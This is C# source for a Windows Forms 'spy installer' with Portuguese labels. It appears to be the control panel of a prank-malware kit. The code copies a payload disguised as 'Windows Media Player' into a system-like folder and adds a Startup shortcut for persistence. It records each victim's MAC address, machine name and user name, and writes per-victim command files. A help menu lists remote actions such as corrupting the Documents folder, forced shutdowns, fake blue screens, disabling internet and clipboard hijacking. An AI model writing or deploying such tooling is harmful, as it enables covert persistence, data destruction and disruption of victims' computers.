using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Numerics;
using System.Security.Cryptography;

namespace spy_instalador
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static string MEU_MAC = "";

        public static void obterMAC()
        {
            try
            {
                MEU_MAC = "";

                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        PhysicalAddress macAddress = nic.GetPhysicalAddress();
                        if (macAddress != null && macAddress.GetAddressBytes().Length != 0)
                        {
                            MEU_MAC += macAddress;
                        }
                    }
                }
            }
            catch { }

        }

        private void button1_Click(object sender, EventArgs e)
        {

            string user = Environment.UserName;
            if (textBox1.Text != "")
            {
                user = textBox1.Text;
            }





            if (!Directory.Exists("Usuarios"))
            {
                Directory.CreateDirectory("Usuarios");
            }
            if (!Directory.Exists("Usuarios/" + Environment.MachineName))
            {
                Directory.CreateDirectory("Usuarios/" + Environment.MachineName);
            }
            if (!Directory.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName))
            {
                Directory.CreateDirectory("Usuarios/" + Environment.MachineName + "/" + Environment.UserName);
            }
            //if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt"))
            //{
            //    File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt");
            //}
            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png"))
            {
                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");

                File.Copy("img.png", "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");
            }
            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png"))
            {
                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");

                File.Copy("img.png", "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png");
            }

            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/__" + user + ".txt"))
            {





                File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/__" + user + ".txt", "");
            }



            string texto = "";
            texto += "0|";//acao
            texto += "0|";//data
            texto += "A virtude da aranha é a paciência, esperando a presa cair na teia|";//FRASE
            texto += "banana vigarista socorro";//ARRAY_PALAVRAS


            File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt", texto);

            attUsuarios();

            msg("Cadastro local criado!");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            obterMAC();
            label1.Text = "MAC: " + MEU_MAC + "\n" +
                "MachineName: " + Environment.MachineName + "\n" +
                "UserName: " + Environment.UserName + "\n";

            attUsuarios();
            this.Text = "";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";

            string arq1_2 = "C:/Windows Media Player/Windows.exe";
            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
            string arq3_2 = "C:/Windows Media Player/Windows.dll";
            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";


            bool tdcerto = false;

            if (File.Exists(arq1))
            {
                if (File.Exists(arq2))
                {
                    if (File.Exists(arq3))
                    {
                        if (File.Exists(arq4))
                        {
                            if (File.Exists(arq5))
                            {
                                tdcerto = true;
                            }
                        }
                    }
                }
            }

            if (tdcerto)
            {
                if (!Directory.Exists("C:/Windows Media Player"))
                {
                    Directory.CreateDirectory("C:/Windows Media Player");
                }
                //------------------------------------
                if (File.Exists(arq1_2))
                {
                    File.Delete(arq1_2);
                }
                File.Copy(arq1, arq1_2);
                //------------------------------------
                if (File.Exists(arq2_2))
                {
                    File.Delete(arq2_2);
                }
                File.Copy(arq2, arq2_2);
                //------------------------------------
                if (File.Exists(arq3_2))
                {
                    File.Delete(arq3_2);
                }
                File.Copy(arq3, arq3_2);
                //------------------------------------
                if (File.Exists(arq4_2))
                {
                    File.Delete(arq4_2);
                }
                File.Copy(arq4, arq4_2);
                //------------------------------------
                if (File.Exists(arq5_2))
                {
                    File.Delete(arq5_2);
                }
                File.Copy(arq5, arq5_2);
                //------------------------------------
                string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                b += "/Microsoft/Windows/Start Menu/Programs/Startup";

                if (File.Exists(b + "/Windows Media Player.lnk"))
                {
                    File.Delete(b + "/Windows Media Player.lnk");
                }
                File.Copy("Windows Media Player.lnk", b + "/Windows Media Player.lnk");

                 

                msg("Instalado com sucesso!");
            }
            else
            {
                //MessageBox.Show("Arquivos faltando");
                msg("ERRO: Arquivos faltando");
            }

        }





        private void timer1_Tick(object sender, EventArgs e)
        {
            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            b += "/Microsoft/Windows/Start Menu/Programs/Startup";

            if (File.Exists(b + "/Windows Media Player.lnk"))
            {
                label2.Text = "Instalado";
            }
            else
            {
                label2.Text = "Não Instalado";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

            string arq1_2 = "C:/Windows Media Player/Windows.exe";
            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
            string arq3_2 = "C:/Windows Media Player/Windows.dll";
            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";


            //------------------------------------
            if (File.Exists(arq1_2))
            {
                File.Delete(arq1_2);
            }
            //------------------------------------
            if (File.Exists(arq2_2))
            {
                File.Delete(arq2_2);
            }
            //------------------------------------
            if (File.Exists(arq3_2))
            {
                File.Delete(arq3_2);
            }
            //------------------------------------
            if (File.Exists(arq4_2))
            {
                File.Delete(arq4_2);
            }
            //------------------------------------
            if (File.Exists(arq5_2))
            {
                File.Delete(arq5_2);
            }
            //------------------------------------
            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            b += "/Microsoft/Windows/Start Menu/Programs/Startup";

            if (File.Exists(b + "/Windows Media Player.lnk"))
            {
                File.Delete(b + "/Windows Media Player.lnk");
            }
             
            msg("Desinstalado com sucesso!");

        }


        //----------------------------------------------------

        List<string> pastas = new List<string>();
        List<string> users = new List<string>();
        string nome_fantasia_temporario = "";

        void attUsuarios()
        {
            try
            {
                pastas.Clear();
                users.Clear();

                string[] arquivos = Directory.GetDirectories("Usuarios");
                foreach (var arquivo in arquivos)
                {

                    //pega as pastas da pasta USUARIOS
                    int ct = arquivo.Split("\\").Length - 1;
                    pastas.Add(arquivo.Split("\\")[ct]);


                    //Pega o nome do computador dos usuarios
                    string[] nome = Directory.GetDirectories("Usuarios/" + arquivo.Split("\\")[ct]);
                    ct = nome[0].Split("\\").Length - 1;
                    users.Add(nome[0].Split("\\")[ct]);



                }

                comboBox1.Items.Clear();
                foreach (var item in pastas)
                {
                    comboBox1.Items.Add(item);
                }
            } catch { }
        }


        private void button4_Click(object sender, EventArgs e)
        {
            attUsuarios();

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

            textBox2.Text = users[comboBox1.SelectedIndex];


            string pastaFinal = "Usuarios/" + comboBox1.Text + "/" + textBox2.Text;
            string arquivos = Directory.GetFiles(pastaFinal, "__*.txt", SearchOption.AllDirectories)[0];
            string nomeFinal = arquivos.Split("\\")[1].Replace(".txt", "").Replace("__", "");
            textBox3.Text = arquivos.Split("\\")[1].Replace(".txt", "").Replace("__", "");
            nome_fantasia_temporario = textBox3.Text;


            //mac
            string mac = "";
            string[] aaaaa = Directory.GetFiles(pastaFinal, "*.txt", SearchOption.AllDirectories);
            foreach (var item in aaaaa)
            {
                if (!item.Contains("__"))
                {
                    mac = item.Replace(".txt", "");
                }
            }
            int ct = mac.Split("\\").Length - 1;
            textBox4.Text = mac.Split("\\")[ct];

            //acao
            string conteudoTXT = File.ReadAllText(pastaFinal + "/" + textBox4.Text + ".txt");
            textBox5.Text = conteudoTXT.Split("|")[0];
            textBox6.Text = conteudoTXT.Split("|")[1];
            textBox7.Text = conteudoTXT.Split("|")[2];
            textBox8.Text = conteudoTXT.Split("|")[3];

        }

       

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                string arquivo = "Usuarios/" + comboBox1.Text + "/" + textBox2.Text + "/" + textBox4.Text + ".txt";
                string frase = textBox5.Text + "|" + textBox6.Text + "|" + textBox7.Text + "|" + textBox8.Text;
                File.WriteAllText(arquivo, frase);

                //muda o nome fantasia
                arquivo = "Usuarios/" + comboBox1.Text + "/" + textBox2.Text + "/__" + nome_fantasia_temporario + ".txt";
                string arquivoFinal = "Usuarios/" + comboBox1.Text + "/" + textBox2.Text + "/__" + textBox3.Text + ".txt";
                File.Move(arquivo, arquivoFinal);

                attUsuarios();
                msg("Dados salvos com sucesso!");
            }
            catch
            {
                msg("ERRO: Usuario não foi salvo");
            }

           
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("" +
    "0 = Nada, mas mantem o programa aberto\r\n1 = Nada, e fecha o programa\r\n2 = Mouse loco\r\n3 = Poluir o Desktop com arquivos diversos\r\n4 = Poluir a pasta Documentos com arquivos diversos\r\n5 = Ficar abrindo a calculadora sem parar\r\n6 = Ficar abrindo o notepad sem parar\r\n7 = Ficar abrindo sites aleatorios sem parar (ver ARRAY_SITES)\r\n8 = Ficar digitando palavras aleatorios sem parar obtidas di site\r\n9 = Nicolas Cage na tela sem parar \r\n10 = Desativa a internet\r\n11 = Desativa a internet ao navegar e ativa ao fechar navegadores \r\n12 = Fecha os navegadores repetidamente\r\n13 = Buga o PC, finalizando o EXPLORER.EXE\r\n14 = Clica o Mouse em um lugar aleatorio da tela\r\n15 = Ficar digitando letras aleatorias sem parar\r\n16 = Simula um pixel queimado na tela (linha)\r\n17 = Simula um pixel queimado na tela\r\n18 = Corrompe os arquivos da pasta \"Documentos\" e fecha o programa\r\n19 = Desliga o pc\r\n20 = Reinicia o pc\r\n21 = Mensagem de erro e reinicia o pc\r\n22 = Fica alternando o tema do Windows entre dark e light\r\n23 = Aplica papel de parede via site\r\n24 = Fica minimizando e maximizando a janela atual\r\n25 = Exibe a tela da morte e depois desliga o pc\r\n26 = Exibe BallonTip com a frase do site\r\n27 = Fica ativando e desativando o capslock\r\n28 = Fica mudando o texto do CTRL+V com a frase do site\r\n29 = FakeFreeze usando um print da tela em tela cheia, parecendo que travou o pc\r\n30 = Simula a instalação de um virus e fecha o programa\r\n31 = Fica aumentando o volume de tempo em tempo\r\n32 = Fica diminuindo o volume de tempo em tempo\r\n33 = Renomeia a janela atual com a frase do site\r\n34 = Fica fechando a janela sendo usada atualmente\r\n35 = Corretor FDP (Ao apertar espaço, escreve algo aleatorio)\r\n36 = Fica redimencionando a janela sendo usada atualmente\r\n37 = Fica fazendo log-off no windows\r\n38 = Deixa transparente a janela sendo usada atualmente\r\n39 = Remove o botao FECHAR da janela sendo usada atualmente\r\n40 = Fica bipando o computador com o Console.Beep()"
    );
        }
        void msg(string tt)
        {
            if (tt.Contains("ERRO"))
            {
                label3.ForeColor = Color.Red;
            }
            else
            {
                label3.ForeColor = Color.LimeGreen;
            }

            label3.Text = tt;
            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 1000;
            int ct = 0;
            timer.Tick += (s, e) =>
            {
                if (ct == 3)
                {
                    timer.Stop();
                    label3.Text = "";
                }
                ct++;
            };
            timer.Start();
        }
    }
}
